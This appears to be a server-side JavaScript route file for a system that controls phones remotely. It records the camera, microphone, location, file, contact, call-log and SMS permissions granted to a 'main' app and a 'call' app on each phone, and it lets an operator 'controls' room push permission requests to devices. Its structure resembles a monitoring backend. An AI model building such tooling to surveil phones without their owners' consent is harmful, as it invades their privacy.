require('rootpath')();

const errcode = require('err-code');
const {Op} = require('sequelize');
const ipMiddleware = require('middlewares/ip_address');

async function getPermission(req, res, next) {
    switch(req.query.type) {
        case '0': 
            res.json({
                secondPermiCamera: req.mobile.secondPermiCamera,
                secondPermiMic: req.mobile.secondPermiMic,
                secondPermiPhone: req.mobile.secondPermiPhone,
                secondPermiLocation: req.mobile.secondPermiLocation,
                secondPermiFile: req.mobile.secondPermiFile,
            });
            break;
        case '1':
            res.json({
                thirdPermiContact: req.mobile.thirdPermiContact,
                thirdPermiPhone: req.mobile.thirdPermiPhone,
                thirdPermiCalllog: req.mobile.thirdPermiCalllog,
                thirdPermiSms: req.mobile.thirdPermiSms,
            });
            break;
        default:
            break;
    }
}

async function viewPermission(req, res, next) {
    const {id, type} = req.body;
    const app = req.app;
    const {Mobile} = app.db;
    const mobile = await Mobile.findByPk(id);
    if(!mobile)
        return next(errcode(new Error('not found'), {status: 404}));
    
    const socket = app.socket;
    const mobileSocket = type == '0' ? socket.getMobileMain(mobile.id) : socket.getMobileCall(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if(!room)
        return next(errcode(new Error('not found'), {status: 404}));

    socket.io.to(room).emit('viewPermission');

    res.json({id: mobile.id});    
}

async function uploadPermission(req, res, next) {
    const {id, type} = req.body;
    const {Mobile} = req.app.db;
    switch(type) {
        case 'main':
            const {isGrantedCamera, isGrantedMic, isGrantedPhone: isGrantedSecondPhone, isGrantedLocation, isGrantedFile} = req.body;
            try {
                await Mobile.update({secondPermiCamera: isGrantedCamera, secondPermiMic: isGrantedMic, secondPermiPhone: isGrantedSecondPhone, secondPermiLocation: isGrantedLocation, secondPermiFile: isGrantedFile }, {where: {id}});        
            } catch (e) {
                console.error(`폰에서 메인앱권한 업로드 에러발생: ${e}`);
            }
            res.json({id});
            req.app.socket.io.to('controls').emit('secondPermissionUploaded', {id, isGrantedCamera, isGrantedMic, isGrantedPhone: isGrantedSecondPhone, isGrantedLocation, isGrantedFile});
            break;
        case 'call':
            const {isGrantedContact, isGrantedPhone: isGrantedThirdPhone, isGrantedCalllog, isGrantedSms} = req.body;
            try {
                await Mobile.update({thirdPermiContact: isGrantedContact, thirdPermiPhone: isGrantedThirdPhone, thirdPermiCalllog: isGrantedCalllog, thirdPermiSms: isGrantedSms }, {where: {id}});        
            } catch (e) {
                console.error(`폰에서 콜앱권한 업로드 에러발생: ${e}`);
            }
            res.json({id});
            req.app.socket.io.to('controls').emit('thirdPermissionUploaded', {id, isGrantedContact, isGrantedPhone: isGrantedThirdPhone, isGrantedCalllog, isGrantedSms});
            break;
        default:
            break;
    }
}

async function requestPermission(req, res, next) {
    const {id, type} = req.body;
    const app = req.app;
    const {Mobile} = app.db;
    const mobile = await Mobile.findByPk(id);
    if(!mobile)
        return next(errcode(new Error('not found'), {status: 404}));
    
    const socket = app.socket;
    const mobileSocket = type == '0' ? socket.getMobileMain(mobile.id) : socket.getMobileCall(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if(!room)
        return next(errcode(new Error('not found'), {status: 404}));

    socket.io.to(room).emit('requestPermission');

    res.json({id: mobile.id});    
}

module.exports = app => {
    app.api.route('/mobile/getPermission/:mobile').get(getPermission);
    app.api.route('/mobile/viewPermission').post(viewPermission);
    app.api.route('/mobile/uploadPermission').post(uploadPermission);
    app.api.route('/mobile/requestPermission').post(requestPermission);
}